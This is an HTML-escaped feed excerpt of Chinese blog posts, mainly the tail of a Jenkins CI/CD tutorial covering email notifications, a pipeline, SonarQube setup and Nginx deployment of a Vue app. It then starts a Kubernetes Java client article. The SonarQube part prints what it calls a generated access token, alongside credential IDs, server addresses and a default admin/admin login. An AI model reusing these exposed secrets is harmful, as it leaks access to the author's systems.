            &amp;lt;td&amp;gt;&amp;lt;pre style=&quot;font-size: 11pt; font-family: Tahoma, Arial, Helvetica, sans-serif&quot;&amp;gt;${FAILED_TESTS}&amp;lt;/pre&amp;gt;
                &amp;lt;br /&amp;gt;&amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;&amp;lt;b&amp;gt;&amp;lt;font color=&quot;#0B610B&quot;&amp;gt;构建日志 (最后 100行):&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;
            &amp;lt;hr size=&quot;2&quot; width=&quot;100%&quot; align=&quot;center&quot; /&amp;gt;&amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;Test Logs (if test has ran): &amp;lt;a
                href=&quot;${PROJECT_URL}ws/TestResult/archive_logs/Log-Build-${BUILD_NUMBER}.zip&quot;&amp;gt;${PROJECT_URL}/ws/TestResult/archive_logs/Log-Build-${BUILD_NUMBER}.zip&amp;lt;/a&amp;gt;
                &amp;lt;br /&amp;gt;
            &amp;lt;br /&amp;gt;
            &amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
        &amp;lt;tr&amp;gt;
            &amp;lt;td&amp;gt;&amp;lt;textarea cols=&quot;80&quot; rows=&quot;30&quot; readonly=&quot;readonly&quot;
                    style=&quot;font-family: Courier New&quot;&amp;gt;${BUILD_LOG, maxLines=100}&amp;lt;/textarea&amp;gt;
            &amp;lt;/td&amp;gt;
        &amp;lt;/tr&amp;gt;
    &amp;lt;/table&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;5&quot;&gt;&lt;li&gt;编写脚本添加构建后发送邮件&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;流水线语法界面选择post模板&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150843980-1381614739.png&quot; alt=&quot;image-20210110115326928&quot;/&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;流水线语法界面选择邮件模板&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150902138-54725420.png&quot; alt=&quot;image-20210110115712143&quot;/&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;pipeline {
    agent any

    stages {
        stage('拉取代码') {
            steps {
                checkout([$class: 'GitSCM', branches: [[name: '*/${branch}']], 
                doGenerateSubmoduleConfigurations: false, extensions: [], submoduleCfg: [],
                userRemoteConfigs: [[credentialsId: '0c93f73d-1e42-4d39-a8ab-f07d5dda668f',
                url: 'ssh://git@192.168.0.200:2222/DianJianQiJu/web_test2.git']]])
            }
        }
        stage('编译打包') {
            steps {
                sh label: '', script: 'mvn clean package'
            }
        }
        stage('项目部署') {
            steps {
                deploy adapters: [tomcat8(credentialsId: '22b62c37-4009-4ac3-b82b-fbf926a0cc63', path: '',
                url: 'http://8.136.103.128:8085')], contextPath: null, war: 'target/*.war'
            }
        }
    }
    post { 
        always { 
            emailext( 
                subject: '构建通知：${PROJECT_NAME} - Build # ${BUILD_NUMBER} - ${BUILD_STATUS}!', 
                body: '${FILE,path=&quot;email.html&quot;}', 
                to: 'xx@xx.com' 
            ) 
        } 
        
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;6&quot;&gt;&lt;li&gt;邮件结果展示&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150927886-1980307553.png&quot; alt=&quot;image-20210110121945913&quot;/&gt;&lt;ol start=&quot;7&quot;&gt;&lt;li&gt;邮件相关全局参数参考列表：&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;Configure System -&amp;gt; Extended E-mail Notifification -&amp;gt; Content Token Reference，点击旁边的?号即可参考&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110150950369-1944919702.png&quot; alt=&quot;image-20210110122425975&quot;/&gt;&lt;h4 id=&quot;9-sonarqube代码审查工具&quot;&gt;9. SonarQube代码审查工具&lt;/h4&gt;
&lt;p&gt;SonarQube是一个用于管理代码质量的开放平台，可以快速的定位代码中潜在的或者明显的错误。目前支持java,C#,C/C++,Python,PL/SQL,Cobol,JavaScrip,Groovy等二十几种编程语言的代码质量管理与检测。&lt;/p&gt;
&lt;p&gt;底层使用Elasticsearch作为代码检索工具。&lt;/p&gt;
&lt;h5 id=&quot;91-jenkins整合sonarqube图示&quot;&gt;9.1 Jenkins整合SonarQube图示&lt;/h5&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151014680-362619190.png&quot; alt=&quot;image-20210109191722454&quot;/&gt;&lt;h5 id=&quot;92-安装环境（centos7）&quot;&gt;9.2 安装环境（CentOS7）&lt;/h5&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;软件&lt;/th&gt;
&lt;th&gt;服务器&lt;/th&gt;
&lt;th&gt;版本&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;MySQL&lt;/td&gt;
&lt;td&gt;192.168.0.204&lt;/td&gt;
&lt;td&gt;5.7（8+版本会报错）&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;SonarQube&lt;/td&gt;
&lt;td&gt;192.168.0.200&lt;/td&gt;
&lt;td&gt;6.7.4&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;SonarQube汉化jar包&lt;/td&gt;
&lt;td&gt;192.168.0.200&lt;/td&gt;
&lt;td&gt;1.19&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Sonar-Scanner客户端&lt;/td&gt;
&lt;td&gt;192.168.0.200&lt;/td&gt;
&lt;td&gt;4.2.0&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h5 id=&quot;93-安装步骤&quot;&gt;9.3 安装步骤&lt;/h5&gt;
&lt;ol readability=&quot;-1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;在MySQL数据库中创建sonar数据库&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;安装SonarQube并设置权限&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;yum install unzip
unzip sonarqube-6.7.4.zip #解压
mkdir /opt/sonar #创建目录
mv sonarqube-6.7.4/* /opt/sonar #移动文件
user add sonar #创建sonar用户，必须sonar用于启动，否则报错
chown -R sonar. /opt/sonar #更改sonar目录及文件权限
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;修改SonarQube配置文件&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;vim /opt/sonar/conf/sonar.properties
#内容如下：
sonar.jdbc.username=root 
sonar.jdbc.password=xxxx
sonar.jdbc.url=jdbc:mysql://192.168.0.204:3306/sonar?useUnicode=true&amp;amp;characterEncoding=utf8&amp;amp;rewriteBatchedStatements=true&amp;amp;useConfigs=maxPerformance&amp;amp;useSSL=false
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;注意：SonarQube默认监听9000端口，如果9000端口被占用需要更改。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;启动sonar&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;cd /opt/sonar
su sonar ./bin/linux-x86-64/sonar.sh start #启动
su sonar ./bin/linux-x86-64/sonar.sh status #查看状态
su sonar ./bin/linux-x86-64/sonar.sh stop #停止
tail -f logs/sonar.log #查看日志
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;5&quot;&gt;&lt;li&gt;访问sonar&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;a href=&quot;http://192.168.0.200:9000&quot; target=&quot;_blank&quot;&gt;http://192.168.0.200:9000&lt;/a&gt; 默认账户：admin/admin&lt;/p&gt;
&lt;ol start=&quot;6&quot;&gt;&lt;li&gt;创建token，用于jenkins对sonarqube的凭证管理&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;#这里的凭证我已生成 - SonarQube token
root: f0e71f7e7f194dfe4912d20ed5fa0d481b20e7cf
&lt;/code&gt;
&lt;/pre&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151100210-674623337.png&quot; alt=&quot;image-20210109182904796&quot;/&gt;&lt;ol start=&quot;7&quot;&gt;&lt;li&gt;汉化SonarQube&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;将汉化jar包放入SonarQube安装目录extensions/plugins下，重启SonarQube）&lt;/p&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151120059-726214974.png&quot; alt=&quot;image-20210109185806332&quot;/&gt;&lt;ol start=&quot;8&quot;&gt;&lt;li&gt;关闭将审查结果上传到SCM的功能&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151137010-651170408.png&quot; alt=&quot;image-20210109185330031&quot;/&gt;&lt;ol start=&quot;9&quot;&gt;&lt;li&gt;Jenkins安装SonarQube插件&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151154288-322771061.png&quot; alt=&quot;image-20210109184023896&quot;/&gt;&lt;ol start=&quot;10&quot;&gt;&lt;li&gt;Jenkins添加SonarQube凭证&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151228196-927248658.png&quot; alt=&quot;image-20210109184426164&quot;/&gt;&lt;ol start=&quot;11&quot;&gt;&lt;li&gt;Jenkins安装SonarQube Scanner客户端&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Manage Jenkins-&amp;gt;Global Tool Confifiguration&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151250114-1585371329.png&quot; alt=&quot;image-20210109185008754&quot;/&gt;&lt;ol start=&quot;12&quot;&gt;&lt;li&gt;Jenkins进行SonarQube配置&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Manage Jenkins -&amp;gt; Confifigure System -&amp;gt; SonarQube servers&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151318197-716673468.png&quot; alt=&quot;image-20210109184733792&quot;/&gt;&lt;h5 id=&quot;94-jenkins项目代码审查&quot;&gt;9.4 Jenkins项目代码审查&lt;/h5&gt;
&lt;ol&gt;&lt;li&gt;非流水线项目添加构建步骤&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151339442-1709647104.png&quot; alt=&quot;image-20210109194606823&quot;/&gt;&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;流水线项目添加构建步骤&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;stage('SonarQube代码审查') { 
    steps{ 
        script { 
           # 引入SonarQubeScanner工具
                scannerHome = tool 'sonarqube-scanner' 
        }
        # 引入SonarQube的服务器环境
        withSonarQubeEnv('sonarqube6.7.4') { 
                sh &quot;${scannerHome}/bin/sonar-scanner&quot; 
        } 
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;配置文件模板&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;# 项目的唯一标记（这里我直接写项目名）
sonar.projectKey=jp-console 

# 项目名字
sonar.projectName=jp-console

# 项目版本号
sonar.projectVersion=1.0

# 指定扫描代码的路径，.表示在当前项目的根目录下扫描所有
#sonar.sources=.
sonar.sources=stidem/src/main # 扫描指定目录

# 巨坑！新版sonar插件需指定sonar.java.binaries
sonar.java.binaries=**/target/classes

# 排除不需要扫描的
sonar.exclusions=**/test/**,**/target/**

# Jdk版本
sonar.java.source=1.8
sonar.java.target=1.8

# 源码编码格式
sonar.sourceEncoding=UTF-8
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;常见Bug&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151403953-1541804115.png&quot; alt=&quot;image-20210109203719921&quot;/&gt;&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;代码审查结果&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151422477-1626546895.png&quot; alt=&quot;image-20210110000116888&quot;/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151438317-1418946793.png&quot; alt=&quot;image-20210110000252883&quot;/&gt;&lt;h4 id=&quot;10-jenkins部署vue项目静态资源到nginx&quot;&gt;10 Jenkins部署Vue项目静态资源到Nginx&lt;/h4&gt;
&lt;h5 id=&quot;101-图示&quot;&gt;10.1 图示&lt;/h5&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151456329-310595091.png&quot; alt=&quot;image-20210110125417437&quot;/&gt;&lt;h5 id=&quot;102-安装与配置nginx服务器&quot;&gt;10.2 安装与配置Nginx服务器&lt;/h5&gt;
&lt;ol readability=&quot;-2&quot;&gt;&lt;li&gt;
&lt;p&gt;安装Nginx服务器&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;以Jeeplus Vue项目为例修改nginx.conf配置文件&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;worker_processes  1;

events {
    worker_connections  1024;
}

http {
    include       mime.types;
    default_type  application/octet-stream;

    #access_log  logs/access.log  main;

    sendfile        on;
    
    keepalive_timeout  65;
        

    gzip on;
    gzip_min_length 1k;
    gzip_comp_level 9;
    gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png;
    gzip_vary on;
    gzip_disable &quot;MSIE [1-6]\.&quot;;
        
    proxy_connect_timeout    600;
    proxy_read_timeout       600;
    proxy_send_timeout       600;       

    server {
        listen       80;
        server_name  生产服务器域名或ip;
                
            location ^~ /jeeplus-customer {
            proxy_pass              http://127.0.0.1:8085/jeeplus;
            proxy_set_header        Host 127.0.0.1;
            proxy_set_header        X-Real-IP $remote_addr;
            proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
        }

        location ^~ /userfiles {
            proxy_pass              http://127.0.0.1:8085/jeeplus/userfiles;
            proxy_set_header        Host 127.0.0.1;
            proxy_set_header        X-Real-IP $remote_addr;
            proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
        }
        
        location / { 
            root   html/jp-ui/dist;
            index  index.html index.htm;
        }

        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;Windows下Nginx相关命令&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;cmd 进入Nginx解压目录 执行以下命令

# 启动nginx服务
start nginx
# 修改配置后重新加载生效
nginx -s reload
# 快速停止或关闭Nginx
nginx -s stop
# 正常停止或关闭Nginx
nginx -s quit


# 重新打开日志文件
nginx -s reopen
# 测试nginx配置文件是否正确
nginx -t -c /path/to/nginx.conf 
# 验证配置是否正确:
nginx -t
# 查看Nginx的版本号
nginx -V
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;103-jenkins安装nodejs插件&quot;&gt;10.3 Jenkins安装NodeJS插件&lt;/h5&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151522195-1034369860.png&quot; alt=&quot;image-20210110130301825&quot;/&gt;&lt;h5 id=&quot;104-jenkins配置nginx服务器&quot;&gt;10.4 Jenkins配置Nginx服务器&lt;/h5&gt;
&lt;ol&gt;&lt;li&gt;安装Node.js环境&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Manage Jenkins -&amp;gt; Global Tool Configuration&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151538930-598768271.png&quot; alt=&quot;image-20210110130506191&quot;/&gt;&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;Jenkins安装SSH插件&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151553880-1529788228.png&quot; alt=&quot;image-20210110131151335&quot;/&gt;&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;Jenkins配置SSH远程服务器&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Manage Jenkins -&amp;gt;Configure System&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151613341-1728694327.png&quot; alt=&quot;image-20210110131530375&quot;/&gt;&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;创建前端自由风格项目jp-ui并配置&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;其他步骤与之前的项目配置一致，下面只列出不一样的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151628951-1366783809.png&quot; alt=&quot;image-20210110130812722&quot;/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151640446-386766360.png&quot; alt=&quot;image-20210110130843824&quot;/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151652164-1725961292.png&quot; alt=&quot;image-20210110131014463&quot;/&gt;&lt;ol start=&quot;5&quot;&gt;&lt;li&gt;Window生产服务器安装SSH工具&lt;/li&gt;
&lt;/ol&gt;&lt;ul readability=&quot;4.6059933407325&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;在拿不到Linux root账户的情况下winscp等工具是无法实现文件传输的，此时我们可以借用Bitvise SSH；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1.3957446808511&quot;&gt;
&lt;p&gt;下载地址：&lt;a href=&quot;https://www.bitvise.com/ssh-server-download&quot; target=&quot;_blank&quot;&gt;https://www.bitvise.com/ssh-server-download&lt;/a&gt; &lt;a href=&quot;https://bvdl.s3-eu-west-1.amazonaws.com/BvSshServer-Inst.exe&quot; target=&quot;_blank&quot;&gt;Bitvise SSH Server installer&lt;/a&gt; - version 7.32, size 14.0 MB。我们需要server版软件该工具可以实现双向传输，即linux到Windows和 Linux 获取Windows端文件。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;下载后双击安装 -&amp;gt; 勾选个人版本 -&amp;gt; 输入个人信息，此处的信息不作为scp账户。下面会讲到scp账户&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;进入后点击“open easy setting”&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;server setting，勾选开放防火墙，当然为了安全你可以自己设置仅限局域网&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151709595-1187666682.png&quot; alt=&quot;image-20210110132308513&quot;/&gt;&lt;ul&gt;&lt;li&gt;virtual account 设置，这里就是scp账户信息，很重要。点击添加&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151725014-5484143.png&quot; alt=&quot;image-20210110132523355&quot;/&gt;&lt;ul&gt;&lt;li&gt;设置账户信息&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151739719-49218769.png&quot; alt=&quot;image-20210110132636018&quot;/&gt;&lt;ul&gt;&lt;li&gt;点击virtual account password，设置账户密码&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151753044-379917514.png&quot; alt=&quot;image-20210110132738386&quot;/&gt;&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;点击save changes回到server界面。点击start server，即可启动ssh服务。如有杀毒软件拦截请全部拦截&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151806583-449651080.png&quot; alt=&quot;image-20210110132916022&quot;/&gt;&lt;ol start=&quot;6&quot;&gt;&lt;li&gt;Jenkins点击构建开始执行，查看是否成功。并访问Nginx进行测试&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2214366/202101/2214366-20210110151846393-1791252240.png&quot; alt=&quot;image-20210110133507941&quot;/&gt;&lt;h4 id=&quot;11--jenkins--docker--springcloud微服务持续集成&quot;&gt;11. Jenkins + Docker + SpringCloud微服务持续集成&lt;/h4&gt;
&lt;h5 id=&quot;未完待续&quot;&gt;未完待续...&lt;/h5&gt;
&lt;h4 id=&quot;12-基于kubernetesk8s容器编排工具构建jenkins持续集成&quot;&gt;12. 基于Kubernetes/K8S容器编排工具构建Jenkins持续集成&lt;/h4&gt;
&lt;h5 id=&quot;未完待续-1&quot;&gt;未完待续...&lt;/h5&gt;
</description>
<pubDate>Thu, 14 Jan 2021 00:15:00 +0000</pubDate>
<dc:creator>MPolaris</dc:creator>
<og:description>1. CI/CD 1.1 CI - 持续集成 持续集成（ Continuous integration ， 简称 CI ）指的是，频繁地（一天多次）将代码集成到主干。持续集成的目的就是让产品可以快速迭</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/mpolaris/p/14275351.html</dc:identifier>
</item>
<item>
<title>Kubernetes官方java客户端之八：fluent style - 程序员欣宸</title>
<link>http://www.cnblogs.com/bolingcavalry/p/14275339.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bolingcavalry/p/14275339.html</guid>
<description>&lt;h3 id=&quot;欢迎访问我的github&quot;&gt;欢迎访问我的GitHub&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;内容：所有原创文章分类汇总及配套源码，涉及Java、Docker、Kubernetes、DevOPS等；&lt;/p&gt;
&lt;h3 id=&quot;概览&quot;&gt;概览&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;本文是《Kubernetes官方java客户端》系列的第八篇，以下提到的&lt;span&gt;java客户端&lt;/span&gt;都是指client-jar.jar；&lt;/li&gt;
&lt;li&gt;前文&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/107885697&quot; target=&quot;_blank&quot;&gt;《Kubernetes官方java客户端之七：patch操作》&lt;/a&gt;涉及的知识点、代码、操作都太多了，&lt;span&gt;对作者和读者都是莫大的折磨&lt;/span&gt;，到了本篇咱们轻松一下，写几段简单流畅的代码，了解java客户端对fluent style编程的支持，并且编码完成后的验证操作也很简单；&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;关于fluent-styel&quot;&gt;关于fluent styel&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;也称为fluid coding, fluent programming，是一种增强代码可读性的风格，使得阅读代码时更加自然流畅，特点是函数返回有关类型，使得多个函数的调用前后链接起来。&lt;/li&gt;
&lt;li&gt;关于fluent style可以参考Martin Flowler于2005年发表的文章，地址是：&lt;a href=&quot;https://martinfowler.com/bliki/FluentInterface.html&quot; target=&quot;_blank&quot;&gt;https://martinfowler.com/bliki/FluentInterface.html&lt;/a&gt; ，使用fluent style前后的代码对比如下图所示：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210114075835272-1049357253.png&quot; alt=&quot;3.&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;源码下载&quot;&gt;源码下载&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;如果您不想编码，可以在GitHub下载所有源码，地址和链接信息如下表所示(&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;)：&lt;/li&gt;
&lt;/ol&gt;&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;这个git项目中有多个文件夹，本章的应用在&lt;span&gt;kubernetesclient&lt;/span&gt;文件夹下，如下图红框所示：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202101/485422-20210114075835936-1918120388.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;实战步骤概述&quot;&gt;实战步骤概述&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;在父工程&lt;span&gt;kubernetesclient&lt;/span&gt;下面新建名为&lt;span&gt;fluent&lt;/span&gt;的子工程；&lt;/li&gt;
&lt;li&gt;fluent工程中只有一个类FluentStyleApplication，启动的main方法以及fluent style的代码都在此类中；&lt;/li&gt;
&lt;li&gt;&lt;span&gt;FluentStyleApplication.java&lt;/span&gt;提供四个web接口，功能分别是：新建namespace、新建deployment、新建service、删除前面三个接口新建的所有资源；&lt;/li&gt;
&lt;li&gt;&lt;span&gt;fluent&lt;/span&gt;工程编码完成后，不需要做成镜像部署在kubernetes环境内部，而是作为一个普通SpringBoot应用找个java环境启动即可，与&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/107528068&quot; target=&quot;_blank&quot;&gt;《Kubernetes官方java客户端之三：外部应用 》&lt;/a&gt;一文的部署和启动一致；&lt;/li&gt;
&lt;li&gt;依次调用每个接口，验证功能是否符合预期；&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;编码&quot;&gt;编码&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;在父工程&lt;span&gt;kubernetesclient&lt;/span&gt;下面新建名为&lt;span&gt;fluent&lt;/span&gt;的maven子工程，pom.xml内容如下，需要注意的是排除掉&lt;span&gt;spring-boot-starter-json&lt;/span&gt;，原因请参考&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/107503695&quot; target=&quot;_blank&quot;&gt;《Kubernetes官方java客户端之二：序列化和反序列化问题 》&lt;/a&gt;：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
    &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;

    &amp;lt;parent&amp;gt;
        &amp;lt;groupId&amp;gt;com.bolingcavalry&amp;lt;/groupId&amp;gt;
        &amp;lt;artifactId&amp;gt;kubernetesclient&amp;lt;/artifactId&amp;gt;
        &amp;lt;version&amp;gt;1.0-SNAPSHOT&amp;lt;/version&amp;gt;
        &amp;lt;relativePath&amp;gt;../pom.xml&amp;lt;/relativePath&amp;gt;
    &amp;lt;/parent&amp;gt;

    &amp;lt;groupId&amp;gt;com.bolingcavalry&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;fluent&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;0.0.1-SNAPSHOT&amp;lt;/version&amp;gt;
    &amp;lt;name&amp;gt;fluent&amp;lt;/name&amp;gt;
    &amp;lt;description&amp;gt;Demo project for fluent style&amp;lt;/description&amp;gt;
    &amp;lt;packaging&amp;gt;jar&amp;lt;/packaging&amp;gt;

    &amp;lt;dependencies&amp;gt;
        &amp;lt;dependency&amp;gt;
            &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
            &amp;lt;artifactId&amp;gt;spring-boot-starter-web&amp;lt;/artifactId&amp;gt;
            &amp;lt;exclusions&amp;gt;
                &amp;lt;exclusion&amp;gt;
